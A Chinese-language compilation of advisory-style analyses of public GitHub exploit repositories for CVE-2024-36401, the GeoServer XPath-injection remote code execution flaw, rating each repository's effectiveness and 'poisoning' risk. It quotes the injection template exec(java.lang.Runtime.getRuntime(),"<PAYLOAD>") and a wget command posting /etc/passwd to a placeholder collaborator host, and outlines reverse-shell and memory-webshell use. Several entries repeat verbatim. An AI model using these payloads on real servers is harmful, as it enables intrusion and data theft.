**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

